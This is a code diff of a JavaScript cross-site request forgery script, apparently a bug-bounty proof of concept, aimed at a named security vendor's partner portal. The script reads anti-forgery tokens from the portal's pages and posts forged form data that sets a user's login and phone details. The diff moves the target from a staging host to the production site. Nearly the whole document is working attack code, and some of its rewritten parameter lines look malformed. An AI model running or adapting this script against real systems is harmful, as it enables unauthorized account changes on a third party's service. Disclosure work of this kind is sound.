@@ -17,7 +17,7 @@ function readBody(xhr) {
     var resp = parser.parseFromString(data, "text/html");
     var resp1 = parser.parseFromString(data1, "text/html");
     token = resp.getElementsByName("data[_Token][fields]")[0].value;
-    key = resp1.getElementsByName("data[_Token][key]")[0].value;
+    key = resp1.getElementsByName("_csrfToken")[0].value;
     csrf(token,key);
     return [data, data1];
 }
@@ -30,29 +30,23 @@ xhr.onreadystatechange = function () {
     }
 }
 
-xhr.open("GET", "https://pan-stage.bitdefender.com/UsersPending/edit/1801", true);
+xhr.open("GET", "https://pan.bitdefender.com/partners/my-users-save/", true);
 xhr.send(null);
 
 
 // Sends the CSRF attack to POST data to the UsersPending section, using the previously obtained CSRF token
 function csrf(token, key) {
     var params = "data%5B_Token%5D%5Bfields%5D=" + token + "%25";
-    params += "&data%5BUserPending%5D%5Bfname%5D=okok&";
-    params += "data%5BUserPending%5D%5Blname%5D=lklk&";
-    params += "data%5BUserPending%5D%5Bemail%5D=hacked@bugcrowd.com&";
-    params += "_method=POST&";
-    params += "data%5BUserPending%5D%5Bphone%5D=887688&";
-    params += "data%5BUserPending%5D%5Btype%5D=&";
-    params += "data%5BUserPending%5D%5Bpasswd%5D=Wisdome@1992!!&";
-    params += "data%5BUserPending%5D%5Banswer%5D=approve&";
+    params += "&fname&";
+    params += "lname&";
+    params += "phone&";
+    params += "mobile_phone=887688&";
+    params += "login=ihwoke@live.com&";
     params += "data%5B_Token%5D%5Bunlocked%5D=&";
-    params += "data%5BUserPending%5D%5Breason%5D=&";
-    params += "data%5BUserPending%5D%5Bsend_reject_email%5D=&";
-    params += "data%5BUserPending%5D%5Bsend_reject_email%5D=1&";
-    params += "data%5B_Token%5D%5Bkey%5D=" + key;
+    params += "_csrfToken=" + key;
 
     var x1 = new XMLHttpRequest();
-    x1.open("POST", "https://pan-stage.bitdefender.com/UsersPending/edit/1801");
+    x1.open("POST", "https://pan.bitdefender.com/partners/my-users-save/");
     x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     x1.send(params);
 }
